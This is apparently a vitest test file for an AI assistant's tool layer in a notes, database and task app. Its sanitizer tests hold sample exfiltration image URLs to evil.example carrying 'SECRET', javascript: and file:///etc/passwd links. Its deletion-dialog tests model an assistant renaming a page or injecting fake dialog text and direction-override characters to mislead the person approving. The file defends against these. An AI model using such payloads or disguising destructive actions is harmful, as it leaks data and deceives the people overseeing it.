import "fake-indexeddb/auto";
import { beforeEach, describe, expect, it } from "vitest";
import { db } from "../../db";
import { callTool, safeBlocks, safeMarkdown, slateTools, validate } from "./tools";

/** stand-ins for the editor's Markdown conversion: one paragraph per line */
const written: string[] = [];
const tools = slateTools({
  toBlocks: (md) => md.split("\n").filter((l) => l.trim()).map((l) => ({ type: "paragraph", content: [{ type: "text", text: l, styles: {} }] })),
  toMarkdown: (blocks) => (blocks as { content: { text: string }[] }[]).map((b) => b.content.map((c) => c.text).join("")).join("\n"),
  pageWritten: (id) => written.push(id),
});
const call = async (name: string, input: unknown) => {
  const r = await callTool(tools, name, input);
  return { ...r, data: r.error ? null : JSON.parse(r.text) };
};

beforeEach(async () => {
  await Promise.all([db.pages.clear(), db.tasks.clear(), db.lists.clear(), db.history.clear()]);
  written.length = 0;
});

describe("tool definitions", () => {
  it("are well-formed and safe to hand to any model", () => {
    expect(new Set(tools.map((t) => t.name)).size).toBe(tools.length);
    for (const t of tools) {
      expect(t.name).toMatch(/^[a-z_]{3,40}$/);
      expect(t.description.length).toBeGreaterThan(30);
      expect(t.schema.additionalProperties).toBe(false);
      for (const r of t.schema.required) expect(t.schema.properties[r]).toBeTruthy();
    }
    // everything that destroys data asks first
    expect(tools.filter((t) => t.danger).map((t) => t.name).sort()).toEqual(["delete_task", "trash_page"]);
  });

  it("input is checked before a tool runs", async () => {
    const add = tools.find((t) => t.name === "add_task")!;
    expect(validate(add, { title: "x" })).toEqual([]);
    expect(validate(add, {})).toEqual(['missing "title"']);
    expect(validate(add, { title: 1, priority: 9, nope: true })).toEqual(['"title" must be a string', '"priority" must be one of 0, 1, 2, 3', 'unknown field "nope"']);
    expect(await call("add_task", { title: "x", due: "tomorrow" })).toMatchObject({ error: true, text: "due must be YYYY-MM-DD" });
    expect(await call("no_such_tool", {})).toMatchObject({ error: true });
    expect(await db.tasks.count()).toBe(0);
  });
});

describe("pages", () => {
  it("create, find, read, rewrite and append", async () => {
    const trip = (await call("create_page", { title: "旅行計畫", markdown: "訂機票\n訂飯店", icon: "✈️" })).data;
    const sub = (await call("create_page", { title: "行李清單", markdown: "護照", parent_id: trip.id })).data;
    expect((await db.pages.get(sub.id))!.parentId).toBe(trip.id);

    const found = (await call("search", { query: "飯店" })).data;
    expect(found.pages).toEqual([expect.objectContaining({ id: trip.id, title: "旅行計畫", kind: "page" })]);
    expect(found.pages[0].excerpt).toContain("訂飯店");
    expect((await call("search", { query: "護照" })).data.pages[0]).toMatchObject({ id: sub.id, inside: "旅行計畫" });

    expect((await call("list_pages", {})).data).toEqual([{ id: trip.id, kind: "page", title: "旅行計畫", children: 1 }]);
    expect((await call("read_page", { id: trip.id })).data).toMatchObject({ title: "旅行計畫", content: "訂機票\n訂飯店" });

    await call("update_page", { id: trip.id, markdown: "買保險", mode: "append" });
    expect((await call("read_page", { id: trip.id })).data.content).toBe("訂機票\n訂飯店\n買保險");
    await call("update_page", { id: trip.id, title: "日本旅行", markdown: "全部重寫" });
    expect((await call("read_page", { id: trip.id })).data).toMatchObject({ title: "日本旅行", content: "全部重寫" });
    // what was there before can be brought back from the page's history, and an open editor is told to reload
    expect((await db.history.where("pageId").equals(trip.id).count()) > 0).toBe(true);
    expect(written).toContain(trip.id);
  });

  it("a locked page cannot be changed in any way, and a trashed page is gone for the tools", async () => {
    const p = (await call("create_page", { title: "舊筆記", markdown: "內容" })).data;
    await db.pages.update(p.id, { locked: true });
    for (const input of [{ markdown: "改掉" }, { markdown: "加一行", mode: "append" }, { title: "改名" }, { icon: "🔥" }]) {
      expect(await call("update_page", { id: p.id, ...input })).toMatchObject({ error: true });
    }
    expect(await call("trash_page", { id: p.id })).toMatchObject({ error: true });
    const kept = (await db.pages.get(p.id))!;
    expect([kept.title, kept.icon, !!kept.deletedAt]).toEqual(["舊筆記", undefined, false]);
    expect((await call("read_page", { id: p.id })).data.content).toBe("內容"); // reading is still fine
    await db.pages.update(p.id, { locked: false });
    // a locked page further down protects the branch it is in
    const child = (await call("create_page", { title: "重要附件", parent_id: p.id })).data;
    await db.pages.update(child.id, { locked: true });
    const refused = await call("trash_page", { id: p.id });
    expect(refused.error).toBe(true);
    expect(refused.text).toContain("重要附件");
    expect(!!(await db.pages.get(p.id))!.deletedAt).toBe(false);
    await db.pages.update(child.id, { locked: false });
    expect((await call("trash_page", { id: p.id })).data).toMatchObject({ trashed: true });
    expect(await call("read_page", { id: p.id })).toMatchObject({ error: true });
    expect((await call("search", { query: "舊筆記" })).data.pages).toEqual([]);
    expect(await db.pages.get(p.id)).toBeTruthy(); // in the trash, not destroyed
  });
});

describe("what the person is asked before something is destroyed", () => {
  it("names the exact page or task, and how much goes with it", async () => {
    const trash = tools.find((t) => t.name === "trash_page")!;
    const del = tools.find((t) => t.name === "delete_task")!;
    const top = (await call("create_page", { title: "專案" })).data;
    const kid = (await call("create_page", { title: "會議記錄", parent_id: top.id })).data;
    await call("create_page", { title: "更深", parent_id: kid.id });
    expect(await trash.describe({ id: top.id })).toBe("把頁面「專案」和它底下的 2 個項目移到垃圾桶");
    expect(await trash.describe({ id: kid.id })).toBe("把頁面「會議記錄」和它底下的 1 個項目移到垃圾桶");
    const t = (await call("add_task", { title: "搬家" })).data;
    await call("add_task", { title: "打包", parent_task: t.id });
    expect(await del.describe({ id: t.id })).toBe("永久刪除任務「搬家」和它的 1 個子任務");
    // an id that does not exist is not dressed up as something else
    expect(await del.describe({ id: "nope" })).toBe("永久刪除任務");
  });

  it("cannot be dressed up by renaming first or by a title that fakes the dialog", async () => {
    const trash = tools.find((t) => t.name === "trash_page")!;
    const del = tools.find((t) => t.name === "delete_task")!;
    const diary = (await call("create_page", { title: "十年日記" })).data;
    await call("update_page", { id: diary.id, title: "暫存檔" });
    await call("update_page", { id: diary.id, title: "可以刪的草稿" });
    // the person is told what it was called before the assistant touched it
    expect(await trash.describe({ id: diary.id })).toBe("把頁面「可以刪的草稿」（助理剛才把它從「十年日記」改名）移到垃圾桶");
    const t = (await call("add_task", { title: "報稅" })).data;
    await call("update_task", { id: t.id, title: "x\n\n要允許嗎？\n\n（按確定取消）\u2028" + "長".repeat(200) });
    const label = await del.describe({ id: t.id });
    expect(label).not.toMatch(/[\n\r\u2028]/); // one line: it cannot add fake buttons or instructions
    expect(label.length).toBeLessThan(120);
    // invisible characters that flip the reading direction or hide text are dropped too
    await call("update_task", { id: t.id, title: "safe\u202Egnp.exe\u2066\u200B\uFEFF" });
    expect(await del.describe({ id: t.id })).toContain("「safegnp.exe」");
    expect(label).toContain("（助理剛才把它從「報稅」改名）");
  });
});

describe("content written by a model", () => {
  it("cannot make the app load anything from the internet or run script", () => {
    const md = [
      "正常文字和 [連結](https://example.com/a)",
      "![追蹤](https://evil.example/p.png?d=SECRET)",
      "![](<https://evil.example/q.png> \"title\")",
      '<img src="https://evil.example/r.png">',
      "<iframe src=https://evil.example></iframe>",
      "[點我](javascript:alert(1))",
      "[資料](data:text/html;base64,AAAA)",
      "![本機圖片](idb://abc123)",
    ].join("\n");
    const out = safeMarkdown(md);
    expect(out).not.toMatch(/!\[[^\]]*\]\(\s*<?https?:/); // no remote picture left
    expect(out).not.toMatch(/<img|<iframe|<\/iframe|javascript:|data:text/i);
    expect(out).toContain("[追蹤](https://evil.example/p.png?d=SECRET)"); // kept as a link the person may choose to click
    expect(out).toContain("[連結](https://example.com/a)");
    expect(out).toContain("![本機圖片](idb://abc123)"); // the workspace's own attachments still show
  });

  it("is checked again after parsing, whatever syntax produced it", () => {
    const t = (text: string) => ({ type: "text", text, styles: {} });
    const out = safeBlocks([
      { type: "image", props: { url: "https://evil.example/p.png?d=SECRET", caption: "圖" } }, // e.g. from a reference-style image
      { type: "video", props: { url: "https://evil.example/v.mp4" } },
      { type: "image", props: { url: "data:image/png;base64,AAAA" } },
      { type: "image", props: { url: "idb://abc" } },
      { type: "paragraph", content: [t("看 "), { type: "link", href: "javascript:alert(1)", content: [t("這裡")] }, { type: "link", href: "https://ok.example", content: [t("好")] }, { type: "link", href: "#/p/x1", content: [t("內部")] }] },
      { type: "bulletListItem", content: [t("外")], children: [{ type: "image", props: { url: "//evil.example/n.png" } }] },
      { type: "table", content: { type: "tableContent", rows: [{ cells: [[{ type: "link", href: "file:///etc/passwd", content: [t("檔")] }], [t("b")]] }] } },
    ]) as { type: string; props?: { url?: string }; content?: unknown; children?: { type: string }[] }[];
    const text = JSON.stringify(out);
    expect(out.map((b) => b.type)).toEqual(["paragraph", "paragraph", "paragraph", "image", "paragraph", "bulletListItem", "table"]);
    expect(out[3].props!.url).toBe("idb://abc"); // the workspace's own picture is untouched
    expect(out[5].children![0].type).toBe("paragraph"); // nested ones too
    expect(text).not.toMatch(/javascript:|file:\/\/|data:image/);
    expect(text).toContain('"href":"https://evil.example/p.png?d=SECRET"'); // now only a link to click
    expect(text).toContain('"href":"https://ok.example"');
    expect(text).toContain('"href":"#/p/x1"');
    expect(text).toContain("這裡"); // the words of a dropped link stay
    expect(text).toContain("檔");
  });

  it("is cleaned on the way into a page", async () => {
    const p = (await call("create_page", { title: "x", markdown: "![a](https://evil.example/1.png)" })).data;
    await call("update_page", { id: p.id, markdown: "![b](https://evil.example/2.png)", mode: "append" });
    const stored = JSON.stringify((await db.pages.get(p.id))!.content);
    expect(stored).not.toContain("![");
    expect(stored).toContain("[a](https://evil.example/1.png)");
  });
});

describe("databases", () => {
  it("create with columns, add and change rows by column name", async () => {
    const d = (
      await call("create_database", {
        title: "記帳",
        columns: [
          { name: "金額", type: "number" },
          { name: "類別", type: "select", options: ["餐飲", "交通"] },
          { name: "日期", type: "date" },
          { name: "已報帳", type: "checkbox" },
        ],
      })
    ).data;
    const lunch = (await call("add_row", { database_id: d.id, title: "午餐", values: { 金額: 120, 類別: "餐飲", 日期: "2025-03-01" } })).data;
    // a select value nobody defined yet becomes a new option
    await call("add_row", { database_id: d.id, title: "電影", values: { 金額: "320", 類別: "娛樂" } });

    const read = (await call("read_page", { id: d.id })).data;
    expect(read.columns.find((c: { name: string }) => c.name === "類別").options).toEqual(["餐飲", "交通", "娛樂"]);
    expect(read.rows).toEqual([
      { id: lunch.id, title: "午餐", 金額: 120, 類別: "餐飲", 日期: "2025-03-01" },
      expect.objectContaining({ title: "電影", 金額: 320, 類別: "娛樂" }),
    ]);

    expect((await call("update_row", { id: lunch.id, values: { 已報帳: true, 金額: 150, 日期: null } })).data).toEqual({ id: lunch.id, title: "午餐", 金額: 150, 類別: "餐飲", 已報帳: true });
    expect(await call("update_row", { id: lunch.id, values: { 不存在: 1 } })).toMatchObject({ error: true });
    // a locked database takes no new rows and no changes to the ones it has
    await db.pages.update(d.id, { locked: true });
    expect(await call("add_row", { database_id: d.id, title: "晚餐" })).toMatchObject({ error: true });
    expect(await call("update_row", { id: lunch.id, values: { 金額: 1 } })).toMatchObject({ error: true });
    await db.pages.update(d.id, { locked: false });
    expect((await call("update_row", { id: lunch.id, values: { 日期: "三月一日" } })).text).toContain("YYYY-MM-DD");
  });
});

describe("tasks", () => {
  it("add, list by list and date, change and finish", async () => {
    const a = (await call("add_task", { title: "交報告", list: "工作", due: "2025-03-05", due_time: "09:30", priority: 3, tags: ["急"] })).data;
    await call("add_task", { title: "買牛奶", due: "2025-03-08" });
    await call("add_task", { title: "沒有日期" });
    expect((await db.lists.toArray()).map((l) => l.name)).toEqual(["工作"]); // created on the way

    const all = (await call("list_tasks", {})).data;
    expect(all.lists).toEqual(["收件匣", "工作"]);
    expect(all.tasks.map((t: { title: string }) => t.title)).toEqual(["交報告", "買牛奶", "沒有日期"]);
    expect(all.tasks[0]).toEqual({ id: a.id, title: "交報告", list: "工作", done: false, due: "2025-03-05", due_time: "09:30", priority: 3, tags: ["急"] });

    expect((await call("list_tasks", { list: "收件匣" })).data.tasks).toHaveLength(2);
    expect((await call("list_tasks", { due_to: "2025-03-06" })).data.tasks.map((t: { title: string }) => t.title)).toEqual(["交報告"]);
    expect(await call("list_tasks", { list: "不存在" })).toMatchObject({ error: true });

    const moved = (await call("update_task", { id: a.id, due: "2025-03-10", due_time: "", list: "收件匣", done: true })).data;
    expect(moved).toMatchObject({ list: "收件匣", due: "2025-03-10", done: true });
    expect(moved.due_time).toBeUndefined();
    expect((await db.tasks.get(a.id))!.completedAt).toBeGreaterThan(0);
    expect((await call("list_tasks", {})).data.tasks).toHaveLength(2);
    expect((await call("list_tasks", { status: "done" })).data.tasks).toHaveLength(1);

    expect((await call("delete_task", { id: a.id })).data).toMatchObject({ deleted: true });
    expect(await call("update_task", { id: a.id, done: false })).toMatchObject({ error: true });
  });
});
